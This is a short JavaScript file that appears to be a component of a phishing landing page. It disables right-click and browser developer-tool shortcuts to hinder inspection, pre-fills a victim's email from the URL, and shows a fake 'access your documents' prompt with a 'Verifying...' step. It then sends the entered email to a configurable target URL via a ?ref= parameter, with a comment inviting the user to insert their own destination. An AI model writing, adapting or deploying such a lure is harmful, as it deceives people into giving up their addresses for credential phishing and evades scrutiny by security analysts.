// email-redirect.js

document.addEventListener("DOMContentLoaded", function() {
    // Disable right-click
    document.addEventListener("contextmenu", function(e) {
        e.preventDefault();
    });

    // Disable F12, Ctrl+Shift+I/J/C, Ctrl+U
    document.addEventListener("keydown", function(e) {
        if (
            e.key === "F12" ||
            (e.ctrlKey && e.shiftKey && ["i","j","c"].includes(e.key.toLowerCase())) ||
            (e.ctrlKey && e.key.toLowerCase() === "u")
        ) {
            e.preventDefault();
        }
    });

    // Get email from URL if present
    const urlParams = new URLSearchParams(window.location.search);
    const emailParam = urlParams.get('email');
    if (emailParam) {
        const emailInput = document.getElementById('email');
        if (emailInput) emailInput.value = emailParam;
    }

    // Handle form submission
    const form = document.querySelector("form");
    if (form) {
        form.addEventListener("submit", function(e) {
            e.preventDefault();
            const emailInput = document.getElementById("email");
            if (!emailInput || !emailInput.value || !emailInput.value.includes("@")) {
                alert("Please enter a valid email address to access your documents.");
                return false;
            }

            // Disable submit button
            const submitBtn = this.querySelector(".submit-btn");
            if (submitBtn) {
                submitBtn.textContent = "Verifying...";
                submitBtn.disabled = true;
            }

            // Build redirect URL with ?ref=
            const redirectUrl = "https://example.com/target-page"; // <-- replace with your actual target URL
            const refUrl = `${redirectUrl}?ref=${encodeURIComponent(emailInput.value)}`;

            // Redirect
            window.location.href = refUrl;
        });
    }
});
